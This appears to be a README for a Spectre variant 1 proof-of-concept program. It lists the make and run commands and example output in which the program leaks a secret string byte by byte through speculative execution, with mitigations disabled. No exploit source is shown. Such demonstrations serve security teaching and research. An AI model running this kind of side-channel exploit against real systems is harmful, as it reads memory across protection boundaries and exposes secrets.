# Compiling

```
make
```

# Following was Tested on Intel Core i5-8265U running Microsoft WSL2 - Ubuntu 20.04.4 LTS

# Executing

```
./spectre.out 20:
```
## Example Output 

```
Using a cache hit threshold of 20.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED
Reading 16 bytes:
Reading at malicious_x = 0xffffffffffffdfe8... Success: 0x43=’C’ score=2
Reading at malicious_x = 0xffffffffffffdfe9... Success: 0x43=’C’ score=2
Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x53=’S’ score=949 (second best: 0x54=’T’ score=567)
Reading at malicious_x = 0xffffffffffffdfeb... Success: 0x45=’E’ score=2
Reading at malicious_x = 0xffffffffffffdfec... Success: 0x50=’P’ score=17 (second best: 0x00=’?’ score=2)
Reading at malicious_x = 0xffffffffffffdfed... Success: 0x20=’ ’ score=15 (second best: 0x00=’?’ score=1)
Reading at malicious_x = 0xffffffffffffdfee... Success: 0x41=’A’ score=45 (second best: 0x00=’?’ score=16)
Reading at malicious_x = 0xffffffffffffdfef... Success: 0x53=’S’ score=39 (second best: 0x54=’T’ score=17)
Reading at malicious_x = 0xffffffffffffdff0... Success: 0x53=’S’ score=2
Reading at malicious_x = 0xffffffffffffdff1... Success: 0x49=’I’ score=2
Reading at malicious_x = 0xffffffffffffdff2... Success: 0x47=’G’ score=2
Reading at malicious_x = 0xffffffffffffdff3... Success: 0x4E=’N’ score=2
Reading at malicious_x = 0xffffffffffffdff4... Success: 0x4D=’M’ score=2
Reading at malicious_x = 0xffffffffffffdff5... Success: 0x45=’E’ score=2
Reading at malicious_x = 0xffffffffffffdff6... Unclear: 0x4E=’N’ score=167 (second best: 0x00=’?’ score=85)
Reading at malicious_x = 0xffffffffffffdff7... Success: 0x54=’T’ score=83 (second best: 0x00=’?’ score=35)
```
